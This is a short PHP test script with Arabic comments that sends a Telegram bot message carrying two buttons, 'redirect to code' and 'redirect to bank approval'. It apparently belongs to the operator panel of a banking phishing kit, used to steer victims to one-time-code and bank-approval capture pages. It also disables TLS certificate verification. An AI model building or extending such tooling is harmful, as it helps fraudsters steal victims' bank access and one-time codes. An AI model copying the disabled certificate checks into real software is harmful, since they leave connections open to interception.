<?php
/**
 * افتح هذا بعد الرفع:
 * https://دومينك.com/test-buttons.php
 *
 * لازم توصلك رسالة فيها زرّين في تيليجرام
 */

$cfg = require __DIR__ . '/config.php';
$token = $cfg['telegram_bot_token'];
$chatId = $cfg['telegram_chat_id'];

$post = [
    'chat_id' => $chatId,
    'text' => "🧪 اختبار الأزرار\n\nإذا شفت زرّين تحت هالرسالة = تمام",
    'reply_markup' => json_encode([
        'inline_keyboard' => [[
            ['text' => 'توجيه الى رمز', 'callback_data' => 'otp:test'],
            ['text' => 'توجيه الى موافقة البنك', 'callback_data' => 'bank:test'],
        ]],
    ], JSON_UNESCAPED_UNICODE),
];

$url = "https://api.telegram.org/bot{$token}/sendMessage";
$body = http_build_query($post);
$res = false;
$method = '';

if (function_exists('curl_init')) {
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $body);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $res = curl_exec($ch);
    $method = 'curl';
    curl_close($ch);
}

if ($res === false) {
    $ctx = stream_context_create([
        'http' => [
            'method' => 'POST',
            'header' => "Content-Type: application/x-www-form-urlencoded\r\n",
            'content' => $body,
            'timeout' => 30,
            'ignore_errors' => true,
        ],
        'ssl' => ['verify_peer' => false, 'verify_peer_name' => false],
    ]);
    $res = @file_get_contents($url, false, $ctx);
    $method = 'file';
}

$j = json_decode((string)$res, true);

header('Content-Type: text/html; charset=utf-8');
echo '<meta charset="utf-8">';
echo '<h2>نتيجة الاختبار</h2>';
echo '<p>method: ' . htmlspecialchars($method) . '</p>';

if (!empty($j['ok'])) {
    $hasBtn = !empty($j['result']['reply_markup']);
    echo $hasBtn
        ? '<p style="color:green;font-size:22px">✅ وصلت الرسالة مع الأزرار — افتح تيليجرام</p>'
        : '<p style="color:orange;font-size:22px">⚠️ الرسالة وصلت بدون أزرار</p>';
} else {
    echo '<p style="color:red;font-size:22px">❌ فشل الإرسال</p>';
}

echo '<pre style="background:#111;color:#0f0;padding:12px;direction:ltr;text-align:left">' .
    htmlspecialchars($res ?: 'empty') . '</pre>';
